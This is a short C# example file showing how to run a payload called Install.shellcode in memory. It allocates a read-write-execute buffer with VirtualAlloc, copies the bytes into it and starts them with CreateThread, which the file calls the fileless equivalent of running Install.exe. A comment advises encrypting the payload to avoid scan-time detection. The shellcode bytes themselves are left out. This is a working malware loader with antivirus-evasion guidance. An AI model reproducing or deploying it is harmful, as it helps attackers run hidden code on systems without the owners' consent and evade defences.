using System;
using System.Runtime.InteropServices;

// Example on how to use Install.shellcode

// Install.shellcode wraps up Install.exe in a way that it can be loaded and executed as shellcode.

public static class Program
{
	public static void Main()
	{
		// --- Elevated privileges required ---

		// 1. Load Install.shellcode from resources or from a byte[]
		// Ideally, encrypt the file and decrypt it here to avoid scantime detection.
		byte[] shellCode = ...

		// 2. Create an RWX buffer with the shellcode.
		IntPtr buffer = VirtualAlloc(IntPtr.Zero, (IntPtr)shellCode.Length, 0x1000, 0x40);
		Marshal.Copy(shellCode, 0, buffer, shellCode.Length);

		// 3. Start the shellcode in a thread and wait until it terminated.
		IntPtr thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, out _);
		WaitForSingleObject(thread, 0xffffffff);

		// This is the fileless equivalent to executing Install.exe.
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr VirtualAlloc(IntPtr address, IntPtr size, int allocationType, int protect);
	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateThread(IntPtr threadAttributes, uint stackSize, IntPtr startAddress, IntPtr parameter, uint creationFlags, out uint threadId);
	[DllImport("kernel32.dll")]
	private static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
}